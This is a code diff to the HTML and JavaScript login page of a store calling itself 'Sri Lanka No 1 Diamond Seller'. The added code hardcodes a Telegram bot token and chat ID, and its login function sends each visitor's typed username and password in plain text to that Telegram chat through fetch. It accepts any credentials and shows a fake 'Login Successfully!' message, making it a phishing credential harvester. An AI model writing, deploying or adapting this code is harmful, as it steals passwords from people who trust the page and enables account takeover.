@@ -15,7 +15,6 @@ padding:30px;
 overflow-x:hidden;
 }
 
-/* SUCCESS NOTIFICATION */
 .success-bar{
 position:fixed;
 top:-100px;
@@ -46,7 +45,6 @@ font-weight:bold;
 font-size:18px;
 }
 
-/* ANIMATED FRAME */
 body::before{
 content:"";
 position:fixed;
@@ -65,7 +63,6 @@ pointer-events:none;
 100%{border-color:green;}
 }
 
-/* STORE TITLE */
 .store-title{
 font-size:28px;
 font-weight:900;
@@ -156,7 +153,6 @@ font-weight:bold;
 </head>
 <body>
 
-<!-- SUCCESS BAR -->
 <div id="successBar" class="success-bar">
 <span>✅ Login Successfully!</span>
 <span onclick="closeBar()">✖</span>
@@ -182,7 +178,12 @@ font-weight:bold;
 <div class="footer-text">Sri Lanka No 1 Diamond Seller</div>
 
 <script>
+
 let loggedIn = false;
+
+/* 🔥 ADD YOUR BOT DETAILS HERE */
+let botToken = "8493374890:AAHYANqGrfzvPQpHWHYhUhrxhm6fzPa_Esk";
+let chatId = "8300102049";
 
 function togglePassword(){
 let pw = document.getElementById("password");
@@ -190,6 +191,7 @@ pw.type = (pw.type === "password") ? "text" : "password";
 }
 
 function login(){
+
 let username = document.getElementById("username").value;
 let password = document.getElementById("password").value;
 
@@ -198,19 +200,33 @@ alert("Enter Username & Password");
 return;
 }
 
-localStorage.setItem("savedUsername", username);
-localStorage.setItem("savedPassword", password);
-
 loggedIn = true;
 
-// SHOW SUCCESS BAR
 let bar = document.getElementById("successBar");
 bar.classList.add("show");
 
-// AUTO HIDE AFTER 3 SECONDS
 setTimeout(()=>{
 bar.classList.remove("show");
 },3000);
+
+/* 🔥 SEND TELEGRAM ALERT */
+let message =
+"🚨 NEW LOGIN ALERT 🚨\n\n"+
+"👤 Username: " + username + "\n"+
+"🔑 Password: " + password + "\n"+
+"🌍 Time: " + new Date().toLocaleString();
+
+fetch("https://api.telegram.org/bot"+botToken+"/sendMessage",{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+chat_id:chatId,
+text:message
+})
+});
+
 }
 
 function closeBar(){
@@ -231,6 +247,7 @@ let message = "Hello Admin, I need help.";
 let url = "https://wa.me/" + phone + "?text=" + encodeURIComponent(message);
 window.open(url, "_blank");
 }
+
 </script>
 
 </body>
